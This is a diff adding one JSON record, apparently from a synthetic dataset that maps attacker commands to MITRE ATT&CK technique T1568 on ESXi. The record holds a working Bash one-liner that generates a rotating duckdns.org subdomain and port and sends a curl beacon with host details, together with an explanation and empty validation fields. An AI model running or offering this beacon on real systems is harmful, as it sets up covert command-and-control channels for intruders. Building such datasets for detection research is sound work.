@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(date -u +%s)-$(hostname -s)\"; sub=$(echo -n \"$seed\" | sha256sum | cut -c1-20); dom=\"$sub.duckdns.org\"; port=$(( ( $(date -u +%s) / 60 % 40000 ) + 2000 )); curl -H \"X-ESXi: $(uname -r)\" --connect-timeout 5 \"https://$dom:$port/ping\"",
+  "explanation": "Generates a per-minute rotating DGA subdomain using epoch seconds and hostname, then calculates a time-based port for the curl beacon. This is dynamic resolution aligned with T1568.",
+  "rationale_steps": [
+    "Create a per-minute seed from epoch time and hostname.",
+    "Hash to produce a new subdomain each minute.",
+    "Compute a port from the current minute window.",
+    "Send a curl request to the generated domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-4fa86ed7",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
